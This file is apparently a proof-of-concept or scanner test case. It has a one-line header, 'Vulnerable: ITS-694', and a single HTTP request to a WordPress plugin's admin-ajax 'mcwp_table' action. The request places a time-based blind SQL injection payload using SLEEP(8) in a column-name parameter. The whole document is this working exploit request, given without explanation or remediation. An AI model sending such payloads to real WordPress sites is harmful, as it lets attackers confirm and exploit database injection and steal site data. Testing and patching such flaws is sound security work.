# Vulnerable: ITS-694
GET /wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&draw=1&start=0&length=10&columns[0][name]=EXP(~(SELECT*FROM(SELECT+SLEEP(8))x))&order[0][column]=0&order[0][dir]=ASC
